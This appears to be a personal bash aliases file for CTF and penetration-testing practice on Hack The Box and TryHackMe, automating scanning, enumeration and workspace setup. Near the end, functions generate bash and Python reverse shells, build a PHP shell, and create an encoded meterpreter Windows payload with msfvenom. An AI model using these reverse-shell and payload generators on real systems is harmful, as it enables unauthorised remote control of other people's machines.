# Exports
export ip=$(cat ~/.currip)
export JRE_HOME="/usr/lib/jvm/java-11-openjdk-amd64"
export CATALINA_HOME="/home/master/workspace/pentest/xmlauth/apache-tomcat-8.5.56"
export domain="intelligence.htb"
export PATH="$PATH:/home/master/.local/bin"

# General
alias reload=". ~/.bashrc"
alias re="reload"
alias x="exit"
alias rst="new && x"
alias la="ls -a"
alias ll="ls -l"
alias ..="cd .."
alias new="gnome-terminal"
alias clone="gnome-terminal --working-directory=$(pwd)"
alias inst="sudo apt-get install"
alias uninst="sudo apt-get remove"
alias chmox="chmod +x"
alias start="xdg-open"
alias stuck="cat ~/workspace/stuck.txt"
alias py="python3"
alias pi="python3 -i"
alias calc="nh gnome-calculator"
alias fixg="gsettings set org.gnome.ControlCenter last-panel ''"
alias wspath="readlink ~/ws"
alias grepc="grep --color"
alias grepr="grep -rin --color"
alias s="googler --np -n 5"
alias todo="vim ~/workspace/todo.txt"
alias nctty="echo 'In shell: export SHELL=bash; export TERM=xterm256-color; stty rows 44 columns 105'; stty raw -echo; fg"
alias tab="gnome-terminal --tab 2>/dev/null"
alias etchosts="sudo vim /etc/hosts"
alias sudo="sudo env \"PATH=$PATH\""
alias gs="git status"

# HTB
alias htbu="7z x -phackthebox"
#alias htbnc="nc -nvv $(host docker.hackthebox.eu | awk '{print $4}')"
alias htb="cd ~/workspace/htb"
alias machine="workspace /home/master/workspace/htb/"

# TryHackMe
alias tryhackme="workspace /home/master/workspace/tryhackme/"

# Workflow
alias info="vim info.txt"
alias ginfo="vim ~/workspace/info/info.txt"
alias steps="vim ~/workspace/info/steps.txt"
alias winfiles="cd ~/workspace/info/windowstools/host; hostfiles"
addwinfile() { sudo cp $1 ~/workspace/info/windowstools/host; }
alias linfiles="cd ~/workspace/info/linuxtools/host; hostfiles"
addlinfile() { cp $1 ~/workspace/info/linuxtools/host; }
alias arhtb="autorecon --only-scans-dir --single-target -o scans $ip --heartbeat 30"
alias nmapautoip="nmapAutomator.sh -H $ip -o scans -t"

# Tools
alias testport="nc -nvv $ip"
alias scanports="sudo nmap -v --reason -n -sV -sC -T5 $ip -p"
alias ports1="scanports 1-1000"
alias ports2="scanports 1000-10000"
alias highports="scanports 10000-65535"
alias allports="scanports 1-65535"
alias shlsn="myip; nc -nvlp"
alias steg="cd /opt/steg; ls; java -jar ./Stegsolve.jar & ; cd-"
alias aslroff="echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space"
alias aslron="echo "2" | sudo dd of=/proc/sys/kernel/randomize_va_space"
alias libc="cd ~/Documents/LibcSearcher/libc-database"
alias 2john="ls /usr/share/john/*.*;ls /usr/sbin/*2john"
alias johnru="john --wordlist=~/wls/rockyou.txt"
alias suid="echo 'find / -perm -u=s -type f 2>/dev/null'"
alias masscanip="sudo masscan $ip --port=0-65535 --rate 1000"
alias rtfm="python3 ~/Documents/rtfm/rtfm.py"
alias ldap="nh ~/Documents/ApacheDirectoryStudio/ApacheDirectoryStudio"
alias impacket="ls /usr/share/doc/python3-impacket/examples/*; ls /usr/bin/ | grep impacket-"
alias wgetip="wget -t 1 --waitretry=5 http://$ip/"
alias dirbip="nh dirbuster -u http://$ip/"
alias ssploit="searchsploit"
alias sploit="searchsploit"
alias binwalkall="binwalk --dd='.*'"

# Launchers
alias radeco="~/Documents/radeco/target/release/radeco"
alias ghidra="~/Documents/ghidra_10.0.1_PUBLIC/ghidraRun"
alias ida="/home/master/Documents/ida/idafree-7.0/ida64"

# Utils
newline2comma() { echo $@ |  sed -z 's/ /,/g'; }
sha256() { sha256sum -c <<<"$2 $1"; }
readpipe() { echo "exec 3> $1"; }
e4l() { enum4linux -a -l $@ $ip; }
nh() { nohup $@ >/dev/null 2>&1 & 
}
myip() { ifconfig tun0 | grep inet | head -n 1 | awk '{print $2}'; }
runintab() { tab -- bash -ilc "$@"; }
addhost() { echo "$1 $2" | sudo tee -a /etc/hosts; }
ffufurl() { ffuf -ac -ic -c -t 100 -w ~/wls/dirb/big.txt -e 'txt,html,php' -u "$1//FUZZ"; }

brc() { 
    if [ $# -ne 0 ]; then
        grep $@  ~/.bash_aliases
    else
        vim ~/.bash_aliases
        reload
    fi
}

startvpn() {
    nmcli connection up feca462f-6e19-4dfc-9754-13d0911489d0
}

stopvpn() {
    nmcli connection down feca462f-6e19-4dfc-9754-13d0911489d0
}

fifo(){
    tmpd=`mktemp -d`
    tmpf="$tmpd"/fifo
    mkfifo "$tmpf"
    printf "\$tmpf: %s\n" "$tmpf"
}

# LDAP
ldapip() { 
    dc1=${1%%.*}
    dc2=${1#*.}
    domain=$1
    shift
    ldapsearch -x -h $ip -D "$domain" -b "dc=$dc1,dc=$dc2" $@
}

ldapusers() { ldapip $1 "objectclass=user"; }
ldapusernames() { ldapip $1 -LLL "objectclass=user" sAMAccountName memberof; }

# Tools
nmaps() {
    if [[ "$1" == "-l" ]] && [ -n "$2" ]; then
        ls /usr/share/nmap/scripts/* | grep $2
        return
    fi 
    scripts=""
    for s in $@; do
        scripts=$scripts","$s
    done
    set -x
    nmap -T5 -Pn --script=${scripts:1} $ip; 
    set +x
}

addmsm() {
    cd ~/.msf4/modules
    mkdir -p $(dirname $1)
    cp /usr/share/exploitdb/$1 $1
    cd -
}

hostfiles() { 
    port=8000
    if [ -n "$1" ]; then
        port=$1
    fi
    for i in $(ls); do 
        echo http://$(myip):$port/$i
    done
    python -m SimpleHTTPServer $@
}

linenum() {
    pushd ~/Documents/LinEnum
    echo "Starting server 0.0.0.0:8000"
    echo "Wget http://$myip:8000/LinEnum.sh"
    python -m SimpleHTTPServer &
    popd
}

bloodhoundstart() {
    nh sudo neo4j console
    nh bloodhound
}

# Workspace
newworkspace() {
    dir=$1
    name=$2
    ip=$3
    mkdir $dir/$name
    if [ $? -ne 0 ]; then
       workspace $dir $name
       return
    fi

    cd $dir/$name
    echo $ip > .ip
    mkdir scans dump host
    touch usernames passwords hashes info.txt
    setws $ip
    tab
    echo "IP: $ip" >> info.txt
    info
}

newmachine() {
    if [ $(grep -c $1 /etc/hosts) -eq 0 ]; then
        addhost $2 $1.htb
    fi
    newworkspace ~/workspace/htb/machine/ $@
}

newtryhackme() {
    newworkspace ~/workspace/tryhackme/ $@
}

ws() {
    cd ~/ws
    export ip=$(cat ~/.currip)
    reload
    echo ip: $ip
}

setws() {
    rm ~/ws
    ln -s $(pwd) ~/ws

    echo "Set workspace to: $(pwd)"

    ip=$1
    if [ -z $ip ]; then
        ip=$(cat .ip)
    fi

    echo $ip > ~/.currip
    export ip=$(cat ~/.currip)
    
    ws
}

setip() {
    ws
    echo $1 > .ip
    cd $(wspath)
    setws
}

recon() { 
    sudo sleep 0.1
    nmapautoip Port
    #wgetip -P dump/
    echo curl http://$ip/robots.txt
    curl http://$ip/robots.txt
    dirbip
    nmapautoip Script
    scanports 1-10000 -oN scans/1-10000 -Pn &
}

notes() {
    title="==== Global Info ===="
    echo $title
    more <(grep -in --color=always $@ ~/workspace/info/info.txt)
    python -c "print('='*len('$title'))"
    read

    title="==== RTFM ===="
    echo $title
    more <(rtfm -c $@ 2>/dev/null -pP)
    python -c "print('='*len('$title'))"
    read

    title="==== TryHackMe ===="
    echo $title
    more <(grep -inI --color=always $@ $(find ~/workspace/tryhackme -iname "info.txt"))
    python -c "print('='*len('$title'))"
    read

    title="==== HTB Academy ===="
    echo $title
    more -f <(grep -rinI --color=always $@ ~/workspace/info/htb_academy)
    python -c "print('='*len('$title'))"
    read

    title="==== HTB Machines ===="
    echo $title
    more <(grep -inI --color=always $@ $(find ~/workspace/htb/machine -iname "info.txt"))
    python -c "print('='*len('$title'))"
    read

    title="==== HTB Challenges ===="
    echo $title
    pushd ~/workspace/htb
    more -f <(grep -rinI --color=always $@ $(ls | grep -v machine))
    popd
    python -c "print('='*len('$title'))"
    read

    toolnotes ~/Documents/ctf-tools "==== CTF Tools ====" $@
    toolnotes ~/Documents "==== Tools ====" $@
}

toolnotes() {
    location=$1
    title=$2
    shift 2

    echo $title
    more -f <(ls $location/*| grep \: | grep -iI $@)
    python -c "print('='*len('$title'))"
    read
}

updateapps() {
    sudo nmap --script-updatedb
    sudo apt update; sudo apt install metasploit-framework

    echo ""
    echo Updating PEAS
    cd /opt/tools/peas
    git pull
    addwinfile winPEAS/winPEASbat/winPEAS.bat
    addlinfile linPEAS/linpeas.sh
    echo ""
    searchsploit -u
}

workspace() {
    cd $1/$2
    if [ $? -eq 0 ]; then
        setws
    fi
}

leftterm() {
    runintab msfconsole -q
    tab
    new
    steps
}

revsh() {
    port=40045

    if [ "$#" -ge 2 ]; then
        port=$2
    fi  
    
    echo "$1" | sed "s/IP/$(myip)/g" | sed "s/PORT/$port/g"
}

revbash() {
    revsh "bash -i >& /dev/tcp/IP/PORT 0>&1" $@
}

revpy() {
    sh="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    revsh "$sh" $@
}

revphp() {
    port=40045

    if [ "$#" -ge 1 ]; then
        port=$1
    fi

    cat ~/workspace/info/shells/shell.php | sed "s/IP/$(myip)/g" | sed "s/PORT/$port/g" > ./shell.php
}

revmetwin() {
    port=40046

    if [ "$#" -ge 1 ]; then
        port=$1
    fi

    msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=$(myip) LPORT=$port -f exe -o shell$port.exe

    echo
    echo "Payload=windows/meterpreter/reverse_tcp LPORT=$port LHOST=$(myip)"
}

upgradesh() { 
    echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
}
